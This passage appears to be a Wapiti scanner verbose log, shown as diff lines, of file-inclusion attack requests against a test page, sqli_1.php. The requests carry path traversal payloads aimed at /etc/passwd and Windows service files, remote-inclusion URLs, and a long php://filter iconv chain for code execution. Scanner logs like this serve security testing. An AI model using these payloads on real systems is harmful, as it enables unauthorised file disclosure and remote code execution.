+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:41:23.415 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:41:23.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:41:23.483 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:41:23.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:41:23.505 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:41:23.515 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:41:23.526 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:41:23.536 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:41:23.546 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:41:23.557 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=sqli_1.php
+2024-03-20 16:41:23.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=sqli_1.php%00
+2024-03-20 16:41:23.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=sqli_1.php%3A%3A%24DATA
+2024-03-20 16:41:23.592 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:23.595 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&bug=13
+2024-03-20 16:41:23.605 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&bug=13
+2024-03-20 16:41:23.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.624 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.634 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.655 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=13
+2024-03-20 16:41:23.665 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&bug=13
+2024-03-20 16:41:23.673 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&bug=13
+2024-03-20 16:41:23.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&bug=13
+2024-03-20 16:41:23.714 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&bug=13
+2024-03-20 16:41:23.723 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&bug=13
+2024-03-20 16:41:23.733 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.743 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.755 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.761 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.768 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.787 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.793 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.800 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.806 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.813 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&bug=13
+2024-03-20 16:41:23.821 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.827 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.834 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.841 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.847 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.854 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.860 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.867 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.882 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.887 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.892 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.904 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.921 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.927 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.938 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.943 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.949 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.955 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.960 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=file%3A%2F%2F%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=13
+2024-03-20 16:41:23.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&bug=13
+2024-03-20 16:41:23.982 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&bug=13
+2024-03-20 16:41:23.987 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&bug=13
+2024-03-20 16:41:23.993 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&bug=13
+2024-03-20 16:41:23.999 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/sqli_1.php (1)
